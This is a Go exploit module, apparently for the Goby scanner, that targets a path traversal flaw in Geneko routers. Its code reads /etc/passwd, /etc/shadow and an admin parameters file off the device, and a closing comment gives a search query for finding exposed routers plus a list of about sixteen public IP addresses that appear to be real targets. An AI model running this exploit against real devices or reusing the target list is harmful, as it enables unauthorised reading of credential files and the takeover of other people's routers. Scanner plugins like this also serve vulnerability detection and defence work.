package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Geneko Routers Path Traversal",
    "Description": "Geneko router can read any file, /etc/passwd, device account configuration files, etc.:",
    "Product": "Geneko Routers",
    "Homepage": "http://www.geneko.co.rs/",
    "DisclosureDate": "2021-06-06",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "(body=\"lib/gwr.js\" && body=\"files/ruter.css\") ",
    "Level": "3",
    "Impact": "<p>The attacker uses the leaked sensitive information to obtain the web path of the website server to provide help for further attacks.</p>",
    "Recommendation": "<p>1. Upgrade the new version</p><p>2. Prohibit Internet access to the device</p>",
    "References": [
        "https://blogs.securiteam.com/index.php/archives/3317"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "File",
            "type": "createSelect",
            "value": "/../../etc/passwd,/../../etc/shadow,/../../mnt/flash/params/j_admin_admin.params"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10208"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/../../etc/passwd")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, ":/bin/sh") && strings.Contains(resp.Utf8Html, "nobody:"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["File"].(string)
			cfgGet := httpclient.NewGetRequestConfig(fmt.Sprintf("%s", filePath))
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

//fofa  (body="lib/gwr.js" && body="files/ruter.css") || cert="Geneko" || icon_hash="29056450"
// 37.81.236.41
// 84.15.236.213
// 91.80.141.15
// 2.195.228.103
// 149.210.35.70:8080
// 37.83.167.208
// 91.80.135.168:2080
// 83.151.194.18
// 188.207.36.46
// 62.74.145.229
// 188.207.37.92
// 188.207.37.110
// 188.207.42.71
// 212.166.234.86
// 2.192.5.42
// 62.169.78.28
